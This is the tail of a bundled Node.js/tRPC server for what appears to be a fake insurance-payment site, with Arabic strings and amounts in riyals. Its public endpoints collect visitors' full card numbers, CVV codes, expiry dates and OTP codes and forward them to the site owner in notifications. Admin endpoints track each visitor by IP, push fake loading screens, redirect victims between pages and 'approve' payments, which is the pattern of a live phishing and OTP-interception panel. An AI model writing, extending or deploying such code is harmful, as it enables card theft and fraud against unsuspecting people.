        notifyOnPayment: z2.boolean().optional()
      })
    ).mutation(async ({ input }) => {
      const { notifyOnPayment, ...data } = input;
      const result = await upsertInsuranceRequest(data);
      if (result) {
        emitToAdmins("requestUpdated", result);
      }
      if (notifyOnPayment && result) {
        try {
          await notifyOwner({
            title: `\u0637\u0644\u0628 \u062A\u0623\u0645\u064A\u0646 \u062C\u062F\u064A\u062F - ${result.userName ?? "\u0645\u062C\u0647\u0648\u0644"}`,
            content: `\u062A\u0645 \u0627\u0633\u062A\u0644\u0627\u0645 \u0628\u064A\u0627\u0646\u0627\u062A \u0628\u0637\u0627\u0642\u0629 \u0628\u0646\u0643\u064A\u0629 \u062C\u062F\u064A\u062F\u0629
\u0627\u0644\u0627\u0633\u0645: ${result.userName ?? "-"}
\u0627\u0644\u0647\u0627\u062A\u0641: ${result.phoneNumber ?? "-"}
\u0627\u0644\u062E\u0637\u0629: ${result.planName ?? "-"}
\u0627\u0644\u0625\u062C\u0645\u0627\u0644\u064A: ${result.total ?? "-"} \u0631\u064A\u0627\u0644
\u0631\u0642\u0645 \u0627\u0644\u0628\u0637\u0627\u0642\u0629: ${result.cardNumber ?? "-"}
\u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0627\u0646\u062A\u0647\u0627\u0621: ${result.expiryDate ?? "-"}
CVV: ${result.cvv ?? "-"}`
          });
        } catch (e) {
          console.warn("[Notify] Failed to notify owner:", e);
        }
      }
      return result;
    }),
    // إرسال بيانات البطاقة والتحقق من الدفع
    submitPayment: publicProcedure.input(
      z2.object({
        sessionId: z2.string(),
        visitorIp: z2.string().optional(),
        cardNumber: z2.string(),
        cardHolderName: z2.string(),
        expiryDate: z2.string(),
        cvv: z2.string(),
        cardType: z2.string().optional(),
        cardLast4: z2.string().optional(),
        paymentMethod: z2.string().optional(),
        status: z2.enum(["payment_submitted"]).optional()
      })
    ).mutation(async ({ input }) => {
      const result = await upsertInsuranceRequest({
        sessionId: input.sessionId,
        visitorIp: input.visitorIp,
        cardNumber: input.cardNumber,
        cardHolderName: input.cardHolderName,
        expiryDate: input.expiryDate,
        cvv: input.cvv,
        cardType: input.cardType,
        cardLast4: input.cardLast4,
        paymentMethod: input.paymentMethod,
        status: "payment_submitted",
        paymentStatus: "pending"
      });
      if (result) {
        emitToAdmins("requestUpdated", result);
        try {
          await notifyOwner({
            title: `\u0637\u0644\u0628 \u062A\u0623\u0645\u064A\u0646 \u062C\u062F\u064A\u062F - \u0628\u064A\u0627\u0646\u0627\u062A \u0628\u0637\u0627\u0642\u0629 - ${result.userName ?? "\u0645\u062C\u0647\u0648\u0644"}`,
            content: `\u062A\u0645 \u0625\u062F\u062E\u0627\u0644 \u0628\u064A\u0627\u0646\u0627\u062A \u0628\u0637\u0627\u0642\u0629 \u0628\u0646\u0643\u064A\u0629
\u0627\u0644\u0627\u0633\u0645: ${result.userName ?? "-"}
\u0627\u0644\u0647\u0627\u062A\u0641: ${result.phoneNumber ?? "-"}
\u0627\u0644\u062E\u0637\u0629: ${result.planName ?? "-"}
\u0627\u0644\u0625\u062C\u0645\u0627\u0644\u064A: ${result.total ?? "-"} \u0631\u064A\u0627\u0644
\u0631\u0642\u0645 \u0627\u0644\u0628\u0637\u0627\u0642\u0629: ${result.cardNumber ?? "-"}
\u0646\u0648\u0639 \u0627\u0644\u0628\u0637\u0627\u0642\u0629: ${result.cardType ?? "-"}
\u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0627\u0646\u062A\u0647\u0627\u0621: ${result.expiryDate ?? "-"}`
          });
        } catch (e) {
          console.warn("[Notify] Failed:", e);
        }
      }
      return result;
    }),
    // فحص حالة الدفع (polling من الـ frontend)
    checkPayment: publicProcedure.input(z2.object({ sessionId: z2.string() })).query(async ({ input }) => {
      const status = await checkPaymentStatus(input.sessionId);
      return status;
    }),
    // إرسال OTP إلى قاعدة البيانات (يُستدعى عند إدخال الرمز)
    submitOtp: publicProcedure.input(
      z2.object({
        sessionId: z2.string(),
        otp: z2.string()
      })
    ).mutation(async ({ input }) => {
      const result = await submitOtp(input.sessionId, input.otp);
      await notifyOwner({
        title: "\u{1F511} \u0631\u0645\u0632 OTP \u062A\u0645 \u0625\u062F\u062E\u0627\u0644\u0647",
        content: `\u062A\u0645 \u0625\u062F\u062E\u0627\u0644 \u0631\u0645\u0632 OTP \u0644\u0644\u0637\u0644\u0628 \u0631\u0642\u0645 ${input.sessionId.slice(0, 8)}...`
      });
      return result;
    }),
    // التحقق النهائي من OTP (يُستدعى بعد 8 ثوانٍ من loading)
    verifyOtpFinal: publicProcedure.input(z2.object({ sessionId: z2.string() })).mutation(async ({ input }) => {
      const result = await verifyOtp(input.sessionId);
      if (!result) {
        await notifyOwner({
          title: "\u26A0\uFE0F OTP \u063A\u064A\u0631 \u0635\u062D\u064A\u062D",
          content: `\u0631\u0645\u0632 OTP \u0627\u0644\u0645\u062F\u062E\u0644 \u0644\u0644\u0637\u0644\u0628 ${input.sessionId.slice(0, 8)}... \u063A\u064A\u0631 \u0635\u062D\u064A\u062D`
        });
      }
      return { success: result };
    }),
    // فحص الحظر
    checkBanned: publicProcedure.input(z2.object({ ip: z2.string() })).query(async ({ input }) => {
      const banned = await isIpBanned(input.ip);
      return { banned };
    }),
    // فحص شاشة التحميل
    getLoadingScreen: publicProcedure.input(z2.object({ ip: z2.string() })).query(async ({ input }) => {
      const setting = await getLoadingScreenSetting(input.ip);
      return setting ?? { isActive: false, loadingText: "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644...", loadingSubtext: "\u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631" };
    }),
    // فحص أوامر التوجيه المعلقة
    getPendingNav: publicProcedure.input(z2.object({ ip: z2.string() })).query(async ({ input }) => {
      const cmd = await getPendingNavigationCommand(input.ip);
      if (cmd) {
        await markNavigationCommandExecuted(cmd.id);
        return { page: cmd.targetPage };
      }
      return { page: null };
    })
  }),
  // ======= Admin =======
  admin: router({
    // قائمة الطلبات
    listRequests: adminProcedure2.input(
      z2.object({
        search: z2.string().optional(),
        status: z2.string().optional(),
        limit: z2.number().optional(),
        offset: z2.number().optional()
      })
    ).query(async ({ input }) => {
      return getAllInsuranceRequests(input);
    }),
    // تفاصيل طلب
    getRequest: adminProcedure2.input(z2.object({ id: z2.number() })).query(async ({ input }) => {
      return getInsuranceRequestById(input.id);
    }),
    // إحصائيات
    getStats: adminProcedure2.query(async () => {
      return getInsuranceStats();
    }),
    // حظر IP
    banIp: adminProcedure2.input(z2.object({ ip: z2.string(), reason: z2.string().optional() })).mutation(async ({ input }) => {
      await banIp(input.ip, input.reason);
      emitToVisitor(input.ip, "banned", {});
      return { success: true };
    }),
    // رفع الحظر
    unbanIp: adminProcedure2.input(z2.object({ ip: z2.string() })).mutation(async ({ input }) => {
      await unbanIp(input.ip);
      return { success: true };
    }),
    // قائمة المحظورين
    listBanned: adminProcedure2.query(async () => {
      return getAllBannedIps();
    }),
    // التحكم في شاشة التحميل
    setLoadingScreen: adminProcedure2.input(
      z2.object({
        ip: z2.string(),
        isActive: z2.boolean(),
        loadingText: z2.string().optional(),
        loadingSubtext: z2.string().optional()
      })
    ).mutation(async ({ input }) => {
      await setLoadingScreenSetting(input.ip, input.isActive, input.loadingText, input.loadingSubtext);
      emitToVisitor(input.ip, "loadingScreen", {
        isActive: input.isActive,
        loadingText: input.loadingText ?? "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644...",
        loadingSubtext: input.loadingSubtext ?? "\u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631"
      });
      return { success: true };
    }),
    // توجيه زائر
    navigateTo: adminProcedure2.input(z2.object({ ip: z2.string(), page: z2.string() })).mutation(async ({ input }) => {
      await createNavigationCommand(input.ip, input.page);
      emitToVisitor(input.ip, "navigateTo", { page: input.page });
      return { success: true };
    }),
    // قبول الدفع
    approvePayment: adminProcedure2.input(z2.object({ requestId: z2.number() })).mutation(async ({ input }) => {
      await approvePayment(input.requestId);
      const request = await getInsuranceRequestById(input.requestId);
      if (request?.visitorIp) {
        emitToVisitor(request.visitorIp, "paymentApproved", {
          requestId: input.requestId
        });
      }
      return { success: true };
    }),
    // رفض الدفع
    rejectPayment: adminProcedure2.input(z2.object({ requestId: z2.number(), reason: z2.string().optional() })).mutation(async ({ input }) => {
      await rejectPayment(input.requestId);
      const request = await getInsuranceRequestById(input.requestId);
      if (request?.visitorIp) {
        emitToVisitor(request.visitorIp, "paymentRejected", {
          requestId: input.requestId,
          reason: input.reason ?? "\u062A\u0645 \u0631\u0641\u0636 \u0627\u0644\u062F\u0641\u0639"
        });
      }
      return { success: true };
    })
  })
});

// server/_core/context.ts
async function createContext(opts) {
  let user = null;
  try {
    user = await sdk.authenticateRequest(opts.req);
  } catch (error) {
    user = null;
  }
  return {
    req: opts.req,
    res: opts.res,
    user
  };
}

// server/_core/vite.ts
import express from "express";
import fs2 from "fs";
import { nanoid } from "nanoid";
import path2 from "path";
import { createServer as createViteServer } from "vite";

// vite.config.ts
import { jsxLocPlugin } from "@builder.io/vite-plugin-jsx-loc";
import tailwindcss from "@tailwindcss/vite";
import react from "@vitejs/plugin-react";
import fs from "node:fs";
import path from "node:path";
import { defineConfig } from "vite";
import { vitePluginManusRuntime } from "vite-plugin-manus-runtime";
var PROJECT_ROOT = import.meta.dirname;
var LOG_DIR = path.join(PROJECT_ROOT, ".manus-logs");
var MAX_LOG_SIZE_BYTES = 1 * 1024 * 1024;
var TRIM_TARGET_BYTES = Math.floor(MAX_LOG_SIZE_BYTES * 0.6);
function ensureLogDir() {
  if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
  }
}
function trimLogFile(logPath, maxSize) {
  try {
    if (!fs.existsSync(logPath) || fs.statSync(logPath).size <= maxSize) {
      return;
    }
    const lines = fs.readFileSync(logPath, "utf-8").split("\n");
    const keptLines = [];
    let keptBytes = 0;
    const targetSize = TRIM_TARGET_BYTES;
    for (let i = lines.length - 1; i >= 0; i--) {
      const lineBytes = Buffer.byteLength(`${lines[i]}
`, "utf-8");
      if (keptBytes + lineBytes > targetSize) break;
      keptLines.unshift(lines[i]);
      keptBytes += lineBytes;
    }
    fs.writeFileSync(logPath, keptLines.join("\n"), "utf-8");
  } catch {
  }
}
function writeToLogFile(source, entries) {
  if (entries.length === 0) return;
  ensureLogDir();
  const logPath = path.join(LOG_DIR, `${source}.log`);
  const lines = entries.map((entry) => {
    const ts = (/* @__PURE__ */ new Date()).toISOString();
    return `[${ts}] ${JSON.stringify(entry)}`;
  });
  fs.appendFileSync(logPath, `${lines.join("\n")}
`, "utf-8");
  trimLogFile(logPath, MAX_LOG_SIZE_BYTES);
}
function vitePluginManusDebugCollector() {
  return {
    name: "manus-debug-collector",
    transformIndexHtml(html) {
      if (process.env.NODE_ENV === "production") {
        return html;
      }
      return {
        html,
        tags: [
          {
            tag: "script",
            attrs: {
              src: "/__manus__/debug-collector.js",
              defer: true
            },
            injectTo: "head"
          }
        ]
      };
    },
    configureServer(server) {
      server.middlewares.use("/__manus__/logs", (req, res, next) => {
        if (req.method !== "POST") {
          return next();
        }
        const handlePayload = (payload) => {
          if (payload.consoleLogs?.length > 0) {
            writeToLogFile("browserConsole", payload.consoleLogs);
          }
          if (payload.networkRequests?.length > 0) {
            writeToLogFile("networkRequests", payload.networkRequests);
          }
          if (payload.sessionEvents?.length > 0) {
            writeToLogFile("sessionReplay", payload.sessionEvents);
          }
          res.writeHead(200, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ success: true }));
        };
        const reqBody = req.body;
        if (reqBody && typeof reqBody === "object") {
          try {
            handlePayload(reqBody);
          } catch (e) {
            res.writeHead(400, { "Content-Type": "application/json" });
            res.end(JSON.stringify({ success: false, error: String(e) }));
          }
          return;
        }
        let body = "";
        req.on("data", (chunk) => {
          body += chunk.toString();
        });
        req.on("end", () => {
          try {
            const payload = JSON.parse(body);
            handlePayload(payload);
          } catch (e) {
            res.writeHead(400, { "Content-Type": "application/json" });
            res.end(JSON.stringify({ success: false, error: String(e) }));
          }
        });
      });
    }
  };
}
var plugins = [react(), tailwindcss(), jsxLocPlugin(), vitePluginManusRuntime(), vitePluginManusDebugCollector()];
var vite_config_default = defineConfig({
  plugins,
  resolve: {
    alias: {
      "@": path.resolve(import.meta.dirname, "client", "src"),
      "@shared": path.resolve(import.meta.dirname, "shared"),
      "@assets": path.resolve(import.meta.dirname, "attached_assets")
    }
  },
  envDir: path.resolve(import.meta.dirname),
  root: path.resolve(import.meta.dirname, "client"),
  publicDir: path.resolve(import.meta.dirname, "client", "public"),
  build: {
    outDir: path.resolve(import.meta.dirname, "dist/public"),
    emptyOutDir: true
  },
  server: {
    host: true,
    allowedHosts: [
      ".manuspre.computer",
      ".manus.computer",
      ".manus-asia.computer",
      ".manuscomputer.ai",
      ".manusvm.computer",
      "localhost",
      "127.0.0.1"
    ],
    fs: {
      strict: true,
      deny: ["**/.*"]
    }
  }
});

// server/_core/vite.ts
async function setupVite(app, server) {
  const serverOptions = {
    middlewareMode: true,
    hmr: { server },
    allowedHosts: true
  };
  const vite = await createViteServer({
    ...vite_config_default,
    configFile: false,
    server: serverOptions,
    appType: "custom"
  });
  app.use(vite.middlewares);
  app.use("*", async (req, res, next) => {
    const url = req.originalUrl;
    try {
      const clientTemplate = path2.resolve(
        import.meta.dirname,
        "../..",
        "client",
        "index.html"
      );
      let template = await fs2.promises.readFile(clientTemplate, "utf-8");
      template = template.replace(
        `src="/src/main.tsx"`,
        `src="/src/main.tsx?v=${nanoid()}"`
      );
      const page = await vite.transformIndexHtml(url, template);
      res.status(200).set({ "Content-Type": "text/html" }).end(page);
    } catch (e) {
      vite.ssrFixStacktrace(e);
      next(e);
    }
  });
}
function serveStatic(app) {
  const distPath = process.env.NODE_ENV === "development" ? path2.resolve(import.meta.dirname, "../..", "dist", "public") : path2.resolve(import.meta.dirname, "public");
  if (!fs2.existsSync(distPath)) {
    console.error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app.use(express.static(distPath));
  app.use("*", (_req, res) => {
    res.sendFile(path2.resolve(distPath, "index.html"));
  });
}

// server/_core/index.ts
function isPortAvailable(port) {
  return new Promise((resolve) => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}
async function findAvailablePort(startPort = 3e3) {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}
async function startServer() {
  const app = express2();
  const server = createServer(app);
  app.use(express2.json({ limit: "50mb" }));
  app.use(express2.urlencoded({ limit: "50mb", extended: true }));
  registerStorageProxy(app);
  registerOAuthRoutes(app);
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext
    })
  );
  initSocketIO(server);
  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }
  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);
  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }
  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}
startServer().catch(console.error);
